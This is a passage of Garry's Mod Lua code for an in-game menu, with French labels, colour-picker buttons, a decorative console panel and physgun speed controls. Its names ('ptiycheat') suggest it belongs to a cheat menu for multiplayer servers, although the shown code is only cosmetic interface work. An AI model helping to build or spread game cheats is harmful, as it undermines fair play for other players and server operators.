ConsoleText1:SetPos( 5, 25 )
end )

timer.Simple( 0.6, function()
ConsoleText2:SetPos( 5, 25 )
end )

timer.Simple( 2.3, function()
ConsoleText3:SetPos( 5, 25 )
end )

timer.Simple( 2.5, function()
ConsoleText4:SetPos( 5, 25 )
end )


end
end


concommand.Add("fiji_readconsole", function()

timer.Simple( 1, function()
draw.SimpleText("Initialisation...", "BudgetLabel", 5, 12, Color(255, 255, 255,255), 0, 1)
end )
timer.Simple( 2, function() draw.SimpleText("Lecture du cache...", "BudgetLabel", 5, 28, Color(255, 255, 255,255), 0, 1) end )
timer.Simple( 2.5, function() draw.SimpleText("Affichage", "BudgetLabel", 5, 40, Color(255, 255, 255,255), 0, 1) end )

timer.Simple( 2.7, function()
draw.SimpleText("V1.0 - Base du Menu", "BudgetLabel", 5, 52, Color(91, 255, 102,255), 0, 1)
draw.SimpleText("En développement : Catégorie Fun Commandes", "BudgetLabel", 5, 65, Color(255, 100, 100,255), 0, 1)
end )

end)

local CloseCONSOLE = vgui.Create( "DButton", BDConsole)
CloseCONSOLE:SetPos( 670, 8)
CloseCONSOLE:SetSize( 20, 15 )
CloseCONSOLE:SetTextColor( Color( 255, 255, 255, 255 ) )
CloseCONSOLE:SetText( "X" )
CloseCONSOLE.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 50))
end
CloseCONSOLE.DoClick = function()
LocalPlayer():ConCommand("fiji_sv_existmen 0")
BDConsole:Remove()
end
end

local ReturnCONSOLE = vgui.Create( "DButton", BDConsole)
ReturnCONSOLE:SetPos( 638, 8)
ReturnCONSOLE:SetSize( 30, 15)
ReturnCONSOLE:SetTextColor( Color( 255, 255, 255, 255 ) )
ReturnCONSOLE:SetText( "<--" )
ReturnCONSOLE.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 50))
end
ReturnCONSOLE.DoClick = function()
LocalPlayer():ConCommand("ptiycheat")
BDConsole:Remove()
end
end

concommand.Add( "fiji_clearconsole", function() -- fiji_sv_existmen
BDConsole:Remove()

end)

end)

function BD:Options( pContent )
local BDMenuOptions = vgui.Create("DPanel", pContent)
BDMenuOptions:SetSize( 539, 388 )
BDMenuOptions:SetPos( 0, 0 )
BDMenuOptions.Paint = function( self, w, h)
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 0, 2, h - 46, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )

elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 0, 2, h - 46, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )

else
draw.RoundedBox( 0, 0, 0, 2, h - 46, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )

end


draw.RoundedBox( 200, 382, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 149, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 180, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 10, w - 448, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 290, 10, w - 447, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Menu", "ptiycheat_home3", 251, 10, Color(100, 100, 100,255), 0, 1)

draw.RoundedBox( 200, 382, 205, 2, h - 213, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 149, 205, 2, h - 213, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 378, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 151, 205, w - 448, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 290, 205, w - 447, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Autres", "ptiycheat_home3", 250, 205, Color(100, 100, 100,255), 0, 1)
end



local pPOOO = vgui.Create( "DPanel", pContent )
pPOOO:SetSize( 225, 50 )
pPOOO:SetPos( 154, 290 )
function pPOOO:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "VITESSE PHYSICGUN", "ptiycheat_home5", 10, h / 2, color_white, 0, 1 )
end
local pDistanceOOO = vgui.Create( "DNumSlider", pContent )
pDistanceOOO:SetPos( 215, 290 )
pDistanceOOO:SetSize( 180, 50 )
pDistanceOOO:SetText( "" )
pDistanceOOO:SetMin( 10 )
pDistanceOOO:SetMax( 1500 )
pDistanceOOO:SetDecimals( 0 )
pDistanceOOO:SetValue( physgun_wheelspeed:GetInt() or 200 )
pDistanceOOO.Scratch:SetVisible( false )
pDistanceOOO.TextArea:SetTextColor( color_white )
function pDistanceOOO.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistanceOOO:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistanceOOO.SetTall = pDistanceOOO.SetHeight
pDistanceOOO.Slider.Knob:SetTall(5)
end
function pDistanceOOO.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end
function pDistanceOOO:OnValueChanged( val )
RunConsoleCommand( "physgun_wheelspeed", tonumber( self:GetValue() ) )
end

local movingicons = {Material("icon16/exclamation.png"), Material("icon16/delete.png"), Material("icon16/key.png"), Material("icon16/cancel.png"), Material("icon16/rainbow.png"), Material("icon16/wand.png"), nil}


local OpenConsole = vgui.Create( "DButton", pContent)
OpenConsole:SetPos( 485, 363.5)
OpenConsole:SetSize( 50, 20  )
OpenConsole:SetTextColor( Color( 255, 255, 255, 255 ) )
OpenConsole:SetText( "Console" )
OpenConsole.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then


for i, icon in pairs(movingicons) do
local seed = i
local tick = (CurTime() + seed * 10)
local speed = seed % 4 + 1 + (seed * 0.5)
local loltick = (CurTime() * 2+ tick * speed * 10) % w
surface.SetDrawColor(255, 255, 255)
surface.SetMaterial(icon)
local iw, ih = 50, 50
surface.DrawTexturedRect(loltick, 0 + (h * 1.01 / 15) + math.sin(loltick / 30) * 5, iw, ih)
end
DrawBlur(self, 5)

draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 180))

else
OpenConsole:SetTextColor( Color( 255, 255, 255, 100 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 20))
end
function OpenConsole:OnCursorEntered() 	OpenConsole:SizeTo( 60, 30, 0.2, 0 ) OpenConsole:MoveTo( 475, 353.5, 0.2) end
function OpenConsole:OnCursorExited() 	OpenConsole:SizeTo( 50, 20, 0.2, 0 ) OpenConsole:MoveTo( 485, 363.5, 0.2)end
OpenConsole.DoClick = function()
LocalPlayer():ConCommand("fiji_console")
LocalPlayer():ConCommand("clear_ptiycheat")
LocalPlayer():ConCommand("fiji_sv_existmen 1")
end
end

local ColorMenuBB = vgui.Create( "DPanel", BDMenuOptions )
ColorMenuBB:SetSize( 225, 50 )
ColorMenuBB:SetPos( 154, 227 )
function ColorMenuBB:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Joueur", "ptiycheat_home5", 78, 8, color_white, 0, 1 )
end
local OptionsColorRedMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorRedMENUBB:SetPos( 4,20 )
OptionsColorRedMENUBB:SetSize( 20, 20 )
OptionsColorRedMENUBB:SetText( " " )
OptionsColorRedMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(183, 0, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 81, 81))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorRedMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 255")
LocalPlayer():ConCommand("fiji_secondary_color_player 0")
LocalPlayer():ConCommand("fiji_third_color_player 0")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorOrangeMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorOrangeMENUBB:SetPos( 26,20 )
OptionsColorOrangeMENUBB:SetSize( 20, 20 )
OptionsColorOrangeMENUBB:SetText( " " )
OptionsColorOrangeMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(211, 116, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 165, 56))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorOrangeMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 255")
LocalPlayer():ConCommand("fiji_secondary_color_player 144")
LocalPlayer():ConCommand("fiji_third_color_player 0")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorYellowMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorYellowMENUBB:SetPos( 48,20 )
OptionsColorYellowMENUBB:SetSize( 20, 20 )
OptionsColorYellowMENUBB:SetText( " " )
OptionsColorYellowMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(193, 190, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 253, 160))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorYellowMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 255")
LocalPlayer():ConCommand("fiji_secondary_color_player 229")
LocalPlayer():ConCommand("fiji_third_color_player 0")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorGreenMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorGreenMENUBB:SetPos( 70,20 )
OptionsColorGreenMENUBB:SetSize( 20, 20 )
OptionsColorGreenMENUBB:SetText( " " )
OptionsColorGreenMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 155, 106))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 255, 174))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorGreenMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 0")
LocalPlayer():ConCommand("fiji_secondary_color_player 255")
LocalPlayer():ConCommand("fiji_third_color_player 4")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorBlueMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorBlueMENUBB:SetPos( 92,20 )
OptionsColorBlueMENUBB:SetSize( 20, 20 )
OptionsColorBlueMENUBB:SetText( " " )
OptionsColorBlueMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(117, 121, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlueMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 0")
LocalPlayer():ConCommand("fiji_secondary_color_player 0")
LocalPlayer():ConCommand("fiji_third_color_player 255")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorBlueMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorBlueMENUBB:SetPos( 114,20 )
OptionsColorBlueMENUBB:SetSize( 20, 20 )
OptionsColorBlueMENUBB:SetText( " " )
OptionsColorBlueMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(144, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(191, 109, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlueMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 114")
LocalPlayer():ConCommand("fiji_secondary_color_player 0")
LocalPlayer():ConCommand("fiji_third_color_player 255")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorPinkMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorPinkMENUBB:SetPos( 136,20 )
OptionsColorPinkMENUBB:SetSize( 20, 20 )
OptionsColorPinkMENUBB:SetText( " " )
OptionsColorPinkMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(250, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(252, 96, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPinkMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 255")
LocalPlayer():ConCommand("fiji_secondary_color_player 0")
LocalPlayer():ConCommand("fiji_third_color_player 242")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorBlackMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorBlackMENUBB:SetPos( 158,20 )
OptionsColorBlackMENUBB:SetSize( 20, 20 )
OptionsColorBlackMENUBB:SetText( " " )
OptionsColorBlackMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(45, 45, 45))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(60, 60, 60))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlackMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 0")
LocalPlayer():ConCommand("fiji_secondary_color_player 0")
LocalPlayer():ConCommand("fiji_third_color_player 0")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColormultiMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColormultiMENUBB:SetPos( 202,20 )
OptionsColormultiMENUBB:SetSize( 20, 20 )
OptionsColormultiMENUBB:SetText( " " )
OptionsColormultiMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColormultiMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_style_player 1")
surface.PlaySound( fiji_ptiycheathover )
end
end
local OptionsColorwhiteMENUBB = vgui.Create( "DButton", ColorMenuBB )
OptionsColorwhiteMENUBB:SetPos( 180,20 )
OptionsColorwhiteMENUBB:SetSize( 20, 20 )
OptionsColorwhiteMENUBB:SetText( " " )
OptionsColorwhiteMENUBB.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(200,200,200))
surface.SetDrawColor(255, 255, 255,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255,255,255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorwhiteMENUBB.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_player 255")
LocalPlayer():ConCommand("fiji_secondary_color_player 255")
LocalPlayer():ConCommand("fiji_third_color_player 255")
LocalPlayer():ConCommand("fiji_style_player 0")
surface.PlaySound( fiji_ptiycheathover )
end
end





local ColorMenu = vgui.Create( "DPanel", BDMenuOptions )
ColorMenu:SetSize( 225, 50 )
ColorMenu:SetPos( 154, 30 )
function ColorMenu:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Menu", "ptiycheat_home5", 79, 8, color_white, 0, 1 )
end
local OptionsColorRedMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorRedMENU:SetPos( 4,20 )
OptionsColorRedMENU:SetSize( 20, 20 )
OptionsColorRedMENU:SetText( " " )
OptionsColorRedMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(183, 0, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 81, 81))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorRedMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 238")
LocalPlayer():ConCommand("fiji_menu_sec_color 61")
LocalPlayer():ConCommand("fiji_menu_th_color 61")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorOrangeMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorOrangeMENU:SetPos( 26,20 )
OptionsColorOrangeMENU:SetSize( 20, 20 )
OptionsColorOrangeMENU:SetText( " " )
OptionsColorOrangeMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(211, 116, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 165, 56))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorOrangeMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 255")
LocalPlayer():ConCommand("fiji_menu_sec_color 162")
LocalPlayer():ConCommand("fiji_menu_th_color 91")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorYellowMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorYellowMENU:SetPos( 48,20 )
OptionsColorYellowMENU:SetSize( 20, 20 )
OptionsColorYellowMENU:SetText( " " )
OptionsColorYellowMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(193, 190, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 253, 160))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorYellowMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 246")
LocalPlayer():ConCommand("fiji_menu_sec_color 255")
LocalPlayer():ConCommand("fiji_menu_th_color 91")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorGreenMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorGreenMENU:SetPos( 70,20 )
OptionsColorGreenMENU:SetSize( 20, 20 )
OptionsColorGreenMENU:SetText( " " )
OptionsColorGreenMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(2, 178, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(119, 255, 117))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorGreenMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 130")
LocalPlayer():ConCommand("fiji_menu_sec_color 255")
LocalPlayer():ConCommand("fiji_menu_th_color 132")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorBlueMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorBlueMENU:SetPos( 92,20 )
OptionsColorBlueMENU:SetSize( 20, 20 )
OptionsColorBlueMENU:SetText( " " )
OptionsColorBlueMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(117, 121, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlueMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 104")
LocalPlayer():ConCommand("fiji_menu_sec_color 102")
LocalPlayer():ConCommand("fiji_menu_th_color 255")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPurpleMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorPurpleMENU:SetPos( 114,20 )
OptionsColorPurpleMENU:SetSize( 20, 20 )
OptionsColorPurpleMENU:SetText( " " )
OptionsColorPurpleMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(144, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(191, 109, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPurpleMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 168")
LocalPlayer():ConCommand("fiji_menu_sec_color 102")
LocalPlayer():ConCommand("fiji_menu_th_color 255")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPinkMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorPinkMENU:SetPos( 136,20 )
OptionsColorPinkMENU:SetSize( 20, 20 )
OptionsColorPinkMENU:SetText( " " )
OptionsColorPinkMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(250, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(252, 96, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPinkMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 255")
LocalPlayer():ConCommand("fiji_menu_sec_color 102")
LocalPlayer():ConCommand("fiji_menu_th_color 235")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorBlackMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorBlackMENU:SetPos( 158,20 )
OptionsColorBlackMENU:SetSize( 20, 20 )
OptionsColorBlackMENU:SetText( " " )
OptionsColorBlackMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(45, 45, 45))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(60, 60, 60))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlackMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_menu_princ_color 60")
LocalPlayer():ConCommand("fiji_menu_sec_color 60")
LocalPlayer():ConCommand("fiji_menu_th_color 60")
LocalPlayer():ConCommand("fiji_style_menu 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColormultiMENU = vgui.Create( "DButton", ColorMenu )
OptionsColormultiMENU:SetPos( 180,20 )
OptionsColormultiMENU:SetSize( 20, 20 )
OptionsColormultiMENU:SetText( " " )
OptionsColormultiMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColormultiMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_style_menu 1")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorhackMENU = vgui.Create( "DButton", ColorMenu )
OptionsColorhackMENU:SetPos( 202,20 )
OptionsColorhackMENU:SetSize( 20, 20 )
OptionsColorhackMENU:SetText( " " )
OptionsColorhackMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorhackMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_style_menu 2")
surface.PlaySound( fiji_ptiycheathover )

end
end

local Optionsphysicspeed = vgui.Create( "DButton", pContent)
Optionsphysicspeed:SetPos( 303, 348)
Optionsphysicspeed:SetSize( 50, 20  )
Optionsphysicspeed:SetTextColor( Color( 255, 255, 255, 255 ) )
Optionsphysicspeed:SetText( "Rapide" )
Optionsphysicspeed.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
Optionsphysicspeed:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 20))
else
Optionsphysicspeed:SetTextColor( Color( 255, 255, 255, 100 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 20))
end
Optionsphysicspeed.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )
end
Optionsphysicspeed.DoClick = function()
LocalPlayer():ConCommand("physgun_wheelspeed 1500")
surface.PlaySound( fiji_ptiycheatclick )
end
end

local Optionsphysicmedium = vgui.Create( "DButton", pContent)
Optionsphysicmedium:SetPos( 243, 348)
Optionsphysicmedium:SetSize( 50, 20  )
Optionsphysicmedium:SetTextColor( Color( 255, 255, 255, 255 ) )
Optionsphysicmedium:SetText( "Moyen" )
Optionsphysicmedium.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
Optionsphysicmedium:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 20))
else
Optionsphysicmedium:SetTextColor( Color( 255, 255, 255, 100 ) )
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 20))
end
Optionsphysicmedium.OnCursorEntered = function(self)
surface.PlaySound( fiji_ptiycheathover )
end
Optionsphysicmedium.DoClick = function()
LocalPlayer():ConCommand("physgun_wheelspeed 600")
surface.PlaySound( fiji_ptiycheatclick )
end
end

local Optionsphysiclow = vgui.Create( "DButton", pContent)
Optionsphysiclow:SetPos( 180, 348)
Optionsphysiclow:SetSize( 50, 20  )
Optionsphysiclow:SetTextColor( Color( 255, 255, 255, 255 ) )
Optionsphysiclow:SetText( "Lent" )
Optionsphysiclow.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
Optionsphysiclow:SetTextColor( Color( 255, 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 20))
else
